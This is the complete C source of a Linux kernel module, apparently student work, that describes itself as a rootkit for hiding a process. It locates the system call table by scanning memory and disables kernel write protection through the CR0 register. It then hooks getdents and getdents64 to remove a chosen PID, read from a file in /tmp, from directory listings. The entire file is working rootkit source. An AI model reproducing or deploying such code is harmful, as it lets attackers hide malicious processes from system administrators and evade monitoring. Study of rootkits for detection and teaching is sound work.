#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Process Hiding Module");

#define PID_MAX_LENGTH 8

static int pid_to_hide = -1;

// Structure linux_dirent pour kernel 3.16
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[1];
};

// Pointeurs vers les fonctions originales
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

// Table des appels système
static unsigned long **sys_call_table;

// Trouver la table des appels système
unsigned long **find_sys_call_table(void) {
    unsigned long **sct;
    unsigned long int i;

    for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
        sct = (unsigned long **)i;
        if (sct[__NR_close] == (unsigned long *)sys_close) {
            return sct;
        }
    }
    return NULL;
}

// Activer/désactiver la protection mémoire
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | 0x10000);
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & ~0x10000);
}

// Hook pour getdents
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
    long ret;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    char pid_str[PID_MAX_LENGTH];

    ret = original_getdents(fd, dirp, count);
    if (ret <= 0)
        return ret;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;

    if (copy_from_user(dirent_ker, dirp, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    snprintf(pid_str, PID_MAX_LENGTH, "%d", pid_to_hide);

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        if (strcmp(current_dir->d_name, pid_str) == 0) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirp, dirent_ker, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    kfree(dirent_ker);
    return ret;
}

// Hook pour getdents64
asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    long ret;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    char pid_str[PID_MAX_LENGTH];

    ret = original_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;

    if (copy_from_user(dirent_ker, dirp, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    snprintf(pid_str, PID_MAX_LENGTH, "%d", pid_to_hide);

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        if (strcmp(current_dir->d_name, pid_str) == 0) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirp, dirent_ker, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    kfree(dirent_ker);
    return ret;
}

// Initialisation du module
static int __init rootkit_init(void) {
    struct file *f;
    char buf[PID_MAX_LENGTH];
    mm_segment_t old_fs;

    printk(KERN_INFO "Rootkit: Chargement...\n");

    // Lire le PID depuis le fichier
    old_fs = get_fs();
    set_fs(KERNEL_DS);

    f = filp_open("/tmp/pid_to_hide.txt", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        vfs_read(f, buf, PID_MAX_LENGTH, &f->f_pos);
        sscanf(buf, "%d", &pid_to_hide);
        filp_close(f, NULL);
        printk(KERN_INFO "Rootkit: PID à cacher = %d\n", pid_to_hide);
    } else {
        printk(KERN_ERR "Rootkit: Impossible de lire /tmp/pid_to_hide.txt\n");
        set_fs(old_fs);
        return -1;
    }

    set_fs(old_fs);

    // Trouver la table des appels système
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "Rootkit: sys_call_table introuvable\n");
        return -1;
    }

    printk(KERN_INFO "Rootkit: sys_call_table trouvée à %p\n", sys_call_table);

    // Sauvegarder les fonctions originales
    original_getdents = (void *)sys_call_table[__NR_getdents];
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];

    // Installer les hooks
    unprotect_memory();
    sys_call_table[__NR_getdents] = (unsigned long *)hacked_getdents;
    sys_call_table[__NR_getdents64] = (unsigned long *)hacked_getdents64;
    protect_memory();

    printk(KERN_INFO "Rootkit: Hooks installés - Processus %d maintenant invisible\n", pid_to_hide);

    return 0;
}

// Nettoyage du module
static void __exit rootkit_exit(void) {
    // Restaurer les fonctions originales
    if (sys_call_table) {
        unprotect_memory();
        sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;
        sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents64;
        protect_memory();
    }

    printk(KERN_INFO "Rootkit: Déchargé - Processus %d redevient visible\n", pid_to_hide);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
